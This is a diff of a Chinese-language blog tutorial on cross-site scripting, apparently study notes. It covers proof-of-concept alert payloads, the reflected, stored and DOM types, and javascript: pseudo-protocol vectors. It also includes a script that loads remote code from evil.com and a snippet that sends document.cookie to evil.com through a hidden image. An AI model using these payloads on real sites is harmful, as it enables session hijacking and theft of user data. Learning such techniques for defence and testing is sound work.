@@ -104,9 +104,6 @@
 <p>验证XSS 漏洞存在的PoC 如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;		常用</span><br><span class="line">&lt;script&gt;confirm(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 <p>我们可以在测试页面中提交这样的代码<code>&lt;script&gt;alert（/xss/）&lt;/script&gt; 我们发现，提交的代码</code><script>alert（/xss/）</script><br>被当作字符串输出在HTML页面中，浏览器会根据``<script><br>标签识别为JS语句，并会执行它，执行弹窗操作。也就是说，可以执行其他JS 代码，因此我们验证了XSS漏洞的存在性。</p>
-<h2 id="XSS-的构造"><a href="#XSS-的构造" class="headerlink" title="XSS 的构造"></a>XSS 的构造</h2><ol>
-<li>利用 &lt;&gt;构造HTML/JS<br>可以利用&lt;&gt;构造HTML 标签和<script> 标签。<br>在测试页面提交参数<h1 style='collor∶red'>利用<>构造HTML/JS</h1>提交<script>alert（/xss/）</script></li>
-</ol>
 <h2 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h2><p>XSS 漏洞大概可以分为三个类型∶ 反射型XSS、存储型XSS、DOM 型XSS。</p>
 <h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>反射型XSS 是非持久性、参数型的跨站脚本。反射型XSS 的JS 代码在Web应用的参数（变量）中，如搜索框的反射型XSS。<br>在搜索框中，提交PoC``<script>alert（/xss/）</script>，<br>点击搜索，即可触发反射型XSS。注意到，我们提交的poc 会出现在search.php 页面的keywords 参数中。通过服务器解析产生的XSS</p>
 <h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h3><p>存储型XSS 是持久性跨站脚本。持久性体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。<br>存储型XSS 通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。<br>此时，我们只完成了第一步，将恶意代码写入数据库。因为XSS 使用的JS 代码，Js代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的XSS<br>代码，才能真正触发XSS。此时，需要我们模拟网站后台管理员的身份，查看留言。</p>
@@ -118,12 +115,24 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.a.com&#x2F;test.html?abc&#x3D;&#39;&#39;&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.evil.com&#x2F;evil.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 <p>真正的XSS payload写在这个远程脚本中，避免直接在URL的参数里写入大量的js代码。<br>在evil.js中，可以通过以下代码窃取cookie：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.createElement(&quot;img&quot;);</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;www.evil.com&#x2F;log?&quot;+escape(doument.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>
-<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。<br>实际上，<a target="_blank" rel="noopener" href="http://www.evil.com/log%E5%B9%B6%E4%B8%8D%E4%B8%80%E5%AE%9A%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E4%BC%9A%E5%9C%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8C%E7%95%99%E4%B8%8B%E6%97%A5%E5%BF%97%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0cookie">http://www.evil.com/log并不一定存在，因为这个请求会在远程服务器里留下日志，可以找到cookie</a></p>
-<p><em>如何利用窃取的cookie登录目标用户的账户呢？</em><br>看《白帽子讲web安全》P44或者百度</p>
+<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。<br>实际上，<a target="_blank" rel="noopener" href="http://www.evil.com/log">http://www.evil.com/log</a> 并不一定存在，因为这个请求会在远程服务器里留下日志，可以找到cookie</p>
+<p><strong>如何利用窃取的cookie登录目标用户的账户呢？</strong><br>看《白帽子讲web安全》P44或者百度</p>
 <h3 id="强大的XSS-payload"><a href="#强大的XSS-payload" class="headerlink" title="强大的XSS payload"></a>强大的XSS payload</h3><h4 id="构造GET-和-POST请求"><a href="#构造GET-和-POST请求" class="headerlink" title="构造GET 和 POST请求"></a>构造GET 和 POST请求</h4><p>更新中。。。。</p>
 <h4 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h4><p>利用js在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，将其密码发送到黑客的服务器上。</p>
 <h4 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h4><p>收集用户个人信息，比如用户使用的浏览器，操作系统等等</p>
-<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>也可以使用javascript∶ 伪协议的方式构造XSS<br>提交参数``<a href="javascript∶aLert（/xss/）">touch me!</a>,然后点击超链接，即可触发XSS。<br>也可以使用img 标签的伪协议，但是这种方法在IE6 下测试成功。</p>
+<p>如何通过js脚本识别浏览器版本呢？最直接的就是通过XSS读取浏览器的UserAgent对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(navigator.userAgent);</span><br></pre></td></tr></table></figure>
+<p>但是浏览器的UserAgent是可以伪造的。</p>
+<h4 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h4><p>更新中。。。。</p>
+<h4 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h4><p>通过CSS，来发现一个用户曾经访问过的网站，其原理是利用style的visited属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;a href&#x3D;# &gt;曾经访问过的&lt;&#x2F;a&gt;</span><br><span class="line">	&lt;a href&#x3D;&quot;notexist&quot; &gt;未曾访问过的&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取用户的真实IP地址"><a href="#获取用户的真实IP地址" class="headerlink" title="获取用户的真实IP地址"></a>获取用户的真实IP地址</h4><p>通过XSS Payload还有办法获取一些客户端的本地IP地址<br>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址</p>
+<h2 id="XSS-构造技巧"><a href="#XSS-构造技巧" class="headerlink" title="XSS 构造技巧"></a>XSS 构造技巧</h2><ol>
+<li>利用 &lt;&gt;构造HTML/JS<br>可以利用&lt;&gt;构造HTML 标签和<script> 标签。<br>在测试页面提交参数<h1 style='collor∶red'>利用<>构造HTML/JS</h1>提交<script>alert（/xss/）</script></li>
+</ol>
+<p>更新中。。。。</p>
+<h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><h3 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用<base>标签</h3><h3 id="windows-name的妙用"><a href="#windows-name的妙用" class="headerlink" title="windows.name的妙用"></a>windows.name的妙用</h3><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>也可以使用javascript∶ 伪协议的方式构造XSS<br>提交参数``<a href="javascript∶aLert（/xss/）">touch me!</a>,然后点击超链接，即可触发XSS。<br>也可以使用img 标签的伪协议，但是这种方法在IE6 下测试成功。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3><p>“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS 可以对这些事件进行响应。所以我们可以通过事件触发JS 函数，触发XSS。<br>|事件种类 | en |<br>| :——| :——|<br>|windows 事件 |    对windows 对象触发 Form 事件|<br>|HTML     |    表单内的动作触发事件|<br>|Keyboard 事件 |    键盘按键|<br>|Mouse 事件     |由鼠标或类似用户动作触发的事件 Media 事件|</p>
